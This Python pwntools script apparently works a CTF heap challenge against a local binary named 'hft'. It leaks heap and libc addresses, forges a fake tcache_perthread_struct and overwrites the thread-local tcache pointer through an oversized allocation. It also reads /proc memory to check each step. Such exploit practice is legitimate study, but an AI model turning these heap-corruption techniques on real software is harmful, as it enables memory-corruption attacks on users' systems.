import os, sys, struct
from pwn import *
context.log_level = 'info'
context.arch = 'amd64'
HERE = '/mnt/d/ctf-index/_z_441'
io = process(os.path.join(HERE, 'hft'), env={})

def rd(addr, n):
    with open('/proc/%d/mem' % io.pid, 'rb') as f:
        f.seek(addr)
        return f.read(n)

def maps(pat):
    for line in open('/proc/%d/maps' % io.pid):
        if pat in line:
            return int(line.split('-')[0], 16)
    return None

def alloc(size, data=b''):
    io.recvuntil(b"PKT_RES")
    io.send(p64(size))
    io.send(bytes(data) + b"\n")

def echo():
    io.recvuntil(b"PKT_DATA\x1b[m:[")
    buf = io.recvuntil(b"\x1b[1;34mPKT_INFO", drop=True)
    return buf[:-2]

ECHO6 = b"\x01" + b"\x00"*5
alloc(0x10, b"\x00"*8)
alloc(0x10, p64(0) + p64(0) + p64(0xd31))
alloc(0x1000, b"\x00"*8)
alloc(0x8, ECHO6)
leak = u64(echo()[:6].ljust(8, b"\x00"))
heap = maps('[heap]')
log.info("heap leak=%#x real heap=%#x" % (leak, heap))
log.info("V=%#x R=%#x" % (heap+0x2d0, heap+0x2f0))
log.info("mem @V-0x10: " + rd(heap+0x2c0, 0x50).hex())

fake_tcache = heap + 0x22020
st = bytearray(0x290)
def sc(i, v): st[2*i] = v & 0xff; st[2*i+1] = (v >> 8) & 0xff
def se(i, v): st[0x80+8*i:0x88+8*i] = p64(v)
sc(0, 1); se(0, heap + 0x2e0)
sc(63, 1); se(63, fake_tcache - 0x10)
alloc(0x1000, bytes(st[8:0x290]))
log.info("fake struct @%#x: %s" % (fake_tcache, rd(fake_tcache, 0x30).hex()))
log.info(" entries[0]=%#x entries[63]=%#x" % (
    u64(rd(fake_tcache+0x80, 8)), u64(rd(fake_tcache+0x80+8*63, 8))))
log.info("top area: %s" % rd(heap+0x23010, 0x30).hex())

alloc(0x30001, b"A"*0x316e0 + p64(fake_tcache))
fs = None
# find fs_base via /proc/pid/stat? use the TLS mapping guess: read tcache var candidates
libc_base = maps('441_libc.so.6')
log.info("libc base = %#x" % libc_base)
# TLS block sits right below libc: scan last 0x3000 bytes of the anon region
tcache_addr = None
for page in range(1, 4):
    start = libc_base - 0x1000*page
    d = rd(start, 0x1000)
    for off in range(0, 0x1000, 8):
        v = u64(d[off:off+8])
        if v == fake_tcache:
            tcache_addr = start + off
            break
    if tcache_addr: break
log.info("tcache TLS var found at %#x (delta from fake=%#x)" % (tcache_addr or 0, (tcache_addr or 0) - fake_tcache))

alloc(0x10, ECHO6)
raw = echo()
log.info("libc leak raw = %s" % raw.hex())
log.info("mem @0x2e0: " + rd(heap+0x2d0, 0x40).hex())
io.close()
